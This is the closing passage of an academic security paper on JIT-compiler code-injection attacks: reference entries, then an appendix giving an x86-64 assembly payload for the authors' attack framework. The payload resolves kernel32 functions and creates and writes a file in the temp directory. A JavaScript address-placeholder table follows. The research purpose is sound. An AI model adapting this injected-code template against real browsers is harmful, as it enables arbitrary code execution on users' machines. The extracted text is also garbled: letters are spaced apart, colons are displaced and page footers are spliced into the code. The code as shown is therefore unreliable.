[37] Microsoft. 2006. Data Execution Prevention (DEP). http://support.microsoft.
com/kb/875352/EN-US/. (2006).
[38] Microsoft. 2015. ChakraCore. https://github.com/Microsoft/ChakraCore. (2015).
[39] Microsoft. 2015.
http://msdn.microsoft.com/en-
Control Flow Guard.
us/library/Dn919635.aspx. (2015).
[40] Matt Miller. 2017. Mitigating arbitrary native code execution in Microsoft Edge.
https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-
code-execution/. (2017).
[41] Mozilla. 2015. W xor X JIT-code enabled in Firefox. https://jandemooij.nl/blog/
2015/12/29/wx-jit-code-enabled-in-firefox. (2015).
[42] Mozilla. 2016.
JavaScript:New to SpiderMonkey. https://wiki.mozilla.org/
JavaScript:New_to_SpiderMonkey#Benchmark_your_changes. (2016).
[43] Santosh Nagarakatte, Jianzhou Zhao, Milo M.K. Martin, and Steve Zdancewic.
2009. SoftBound: Highly Compatible and Complete Spatial Memory Safety for
C. In 30th ACM SIGPLAN Conference on Programming Language Design and
Implementation (PLDI).
[44] Santosh Nagarakatte, Jianzhou Zhao, Milo MK Martin, and Steve Zdancewic.
2010. CETS: compiler enforced temporal safety for C. In International Symposium
on Memory Management (ISMM).
[45] Nergal. 2001. The advanced return-into-lib(c) exploits: PaX case study. Phrack
Magazine 11 (2001).
[46] Ben Niu and Gang Tan. 2014. Modular Control-flow Integrity. In 35th ACM SIG-
PLAN Conference on Programming Language Design and Implementation (PLDI).
[47] Ben Niu and Gang Tan. 2014. RockJIT: Securing Just-In-Time Compilation Using
Modular Control-Flow Integrity. In ACM SIGSAC Conference on Computer and
Communications Security (CCS).
[48] PaX. 2003. PaX Address Space Layout Randomization. (2003).
[49] Felix Schuster, Thomas Tendyck, Christopher Liebchen, Lucas Davi, Ahmad-Reza
Sadeghi, and Thorsten Holz. 2015. Counterfeit Object-oriented Programming:
On the Difficulty of Preventing Code Reuse Attacks in C++ Applications. In 36th
IEEE Symposium on Security and Privacy (S&P).
Session K4:  Secure EnclavesCCS’17, October 30-November 3, 2017, Dallas, TX, USA2417[50] Fermin J. Serna. 2012. The Info Leak Era on Software Exploitation. In Blackhat
USA (BH US).
[51] Hovav Shacham. 2007. The geometry of innocent flesh on the bone: return-into-
libc without function calls (on the x86). In ACM SIGSAC Conference on Computer
and Communications Security (CCS).
[52] Kevin Z. Snow, Fabian Monrose, Lucas Davi, Alexandra Dmitrienko, Christopher
Liebchen, and Ahmad-Reza Sadeghi. 2013. Just-In-Time Code Reuse: On the
Effectiveness of Fine-Grained Address Space Layout Randomization. In 34th IEEE
Symposium on Security and Privacy (S&P).
[53] K. Z. Snow, R. Rogowski, J. Werner, H. Koo, F. Monrose, and M. Polychronakis.
2016. Return to the Zombie Gadgets: Undermining Destructive Code Reads via
Code Inference Attacks. In 37th IEEE Symposium on Security and Privacy (S&P).
[54] Chengyu Song, Chao Zhang, Tielei Wang, Wenke Lee, and David Melski. 2015.
Exploiting and Protecting Dynamic Code Generation. In 22nd Annual Network
and Distributed System Security Symposium (NDSS).
[55] Adrian Tang, Simha Sethumadhavan, and Salvatore Stolfo. 2015. Heisenbyte:
Thwarting Memory Disclosure Attacks using Destructive Code Reads. In ACM
SIGSAC Conference on Computer and Communications Security (CCS).
[56] The WebKit team. 2013. SunSpider 1.0.2. https://www.webkit.org/perf/sunspider/
[57] Theori. 2016. Chakra JIT CFG Bypass. http://theori.io/research/chakra-jit-cfg-
sunspider.html. (2013).
bypass. (2016).
[58] Caroline Tice, Tom Roeder, Peter Collingbourne, Stephen Checkoway, Úlfar
Erlingsson, Luis Lozano, and Geoff Pike. 2014. Enforcing Forward-Edge Control-
Flow Integrity in GCC & LLVM. In 23rd USENIX Security Symposium (USENIX
Sec).
Jan Werner, George Baltas, Rob Dallara, Nathan Otterness, Kevin Z. Snow, Fabian
Monrose, and Michalis Polychronakis. 2016. No-Execute-After-Read: Preventing
Code Disclosure in Commodity Software. In 11th ACM Symposium on Information,
Computer and Communications Security (ASIACCS).
[59]
A EXAMPLE PAYLOAD
The text of an example payload to the framework described in Sec-
tion 3 follows. Specifically, this payload creates a file and writes
arbitrary content to it. This payload is parsed by our attack frame-
work, which then creates one or more malicious IR objects for each
statement. The JIT compiler then generates native code correspond-
ing to the payload.
var payload = `;
push rbp
mov rbp , rsp
sub rsp , 0 x500
;
; Resolve function addresses
;
; LoadLibraryEx ( kernel32 . dll , 0 ,0)
;
xor r8 , r8
xor rdx , rdx
mov rcx , # addr_buf_kernel32dll
call # addr_LoadLibraryExA
mov [# addr_handle_kernel32 ], rax
;
;
; GetProcAddr ( hKernel , CreateFile )
;
mov rcx , rax
mov rdx , # addr_buf_CreateFileA
call # addr_GetProcAddr
mov [# addr_ptr_CreateFileA ], rax
mov rcx , rax
;
;
; GetProcAddr ( hKernel , WriteFile )
;
mov rcx , [# addr_handle_kernel32 ]
mov rdx , # addr_buf_WriteFile
call # addr_GetProcAddr
mov [# addr_ptr_WriteFile ], rax
;
;
; GetProcAddr ( hKernel , GetTempPath )
;
mov rcx , [# addr_handle_kernel32 ]
mov rdx , # addr_buf_GetTempPath
call # addr_GetProcAddr
mov [# addr_ptr_GetTempPath ], rax
;
;
; GetProcAddr ( hKernel , CLoseHandle )
;
mov rcx , [# addr_handle_kernel32 ]
mov rdx , # addr_buf_CloseHandle
call # addr_GetProcAddr
mov [# addr_ptr_CloseHandle ], rax
;
;
; GetProcAddr ( hKernel , ExitThread )
;
mov rcx , [# addr_handle_kernel32 ]
mov rdx , # addr_buf_ExitThread
call # addr_GetProcAddr
mov [# addr_ptr_ExitThread ], rax
;
;
; GetTempPath ()
;
mov rcx , 0 x400
mov rdx , # addr_buf_1024
call [# addr_ptr_GetTempPath ]
;
;
; strcat ( tmppath , filename )
;
mov rsi , # addr_buf_file_name
mov rdi , # addr_buf_1024
add rdi , rax
xor rcx , rcx
L_strcat :
xor rax , rax
mov al , [ rsi ]
mov [ rdi ], rax
add rcx , 0 x1
add rsi , 0 x1
Session K4:  Secure EnclavesCCS’17, October 30-November 3, 2017, Dallas, TX, USA2418add rdi , 0 x1
cmp rcx , # len_file_name
jne L_strcat
;
;
; CreateFile ()
;
mov rax , rsp
add rax , 0 x20
mov [ rax ], 0 x2
add rax , 0 x8
mov [ rax ], 0 x80
add rax , 0 x8
mov [ rax ], 0 x0
xor r9 , r9
xor r8 , r8
mov rdx , 0 x40000000
mov rcx , # addr_buf_1024
call [# addr_ptr_CreateFileA ]
mov [# addr_handle_file ], rax
;
;
; WriteFile ()
;
mov rax , rsp
add rax , 0 x20
mov [ rax ], 0 x0
mov r9 , # addr_buf_nbw
mov r8 , # len_file_content
mov rdx , # addr_buf_file_content
mov rcx , [# addr_handle_file ]
call [# addr_ptr_WriteFile ]
;
;
; CloseHandle ()
;
mov rcx , [# addr_handle_file ]
call [# addr_ptr_CloseHandle ]
xor rcx , rcx
call [# addr_ptr_ExitThread ]
; ` ;
var args = {
}
"# addr_LoadLibraryExA "
LoadLibraryEx . hex ( ) ,
"# addr_GetProcAddr "
GetProcAddr . hex ( ) ,
"# addr_buf_kernel32dll "
a d d r _ b u f _ k e r n e l 3 2 d l l . hex ( ) ,
"# addr_handle_kernel32 "
a d d r _ h a n d l e _ k e r n e l 3 2 . hex ( ) ,
"# addr_buf_CreateFileA "
a d d r _ b u f _ C r e a t e F i l e A . hex ( ) ,
"# addr_ptr_CreateFileA "
a d d r _ p t r _ C r e a t e F i l e A . hex ( ) ,
"# addr_ptr_WriteFile "
"# addr_buf_WriteFile "
:
a d d r _ b u f _ W r i t e F i l e . hex ( ) ,
:
a d d r _ p t r _ W r i t e F i l e . hex ( ) ,
:
"# addr_buf_CloseHandle "
addr_buf_CloseHandle . hex ( ) ,
"# addr_ptr_CloseHandle "
addr_ptr_CloseHandle . hex ( ) ,
"# addr_buf_GetTempPath "
addr_buf_GetTempPath . hex ( ) ,
"# addr_ptr_GetTempPath "
addr_ptr_GetTempPath . hex ( ) ,
"# addr_buf_ExitThread "
addr_buf_ExitThread . hex ( ) ,
"# addr_ptr_ExitThread "
a d d r _ p t r _ E x i t T h r e a d . hex ( ) ,
:
:
:
:
:
:
:
:
:
:
:
:
:
:
:
"# addr_buf_1024 "
addr_buf_1024 . hex ( ) ,
"# addr_buf_file_name "
:
a d d r _ bu f _ f i l e _ n am e . hex ( ) ,
"# len_file_name "
f il e_ n am e . l e n g t h + 1 ) . hex ( ) ,
: u64 ( 0 ,
"# addr_handle_file "
a d d r _ h a n d l e _ f i l e . hex ( ) ,
"# addr_buf_nbw "
addr_buf_nbw . hex ( ) ,
"# len_file_content "
f i l e _ c o n t e n t . l e n g t h ) . hex ( ) ,
"# addr_buf_file_content "
a d d r _ b u f _ f i l e _ c o n t e n t . hex ( ) ,
: u64 ( 0 ,
Session K4:  Secure EnclavesCCS’17, October 30-November 3, 2017, Dallas, TX, USA2419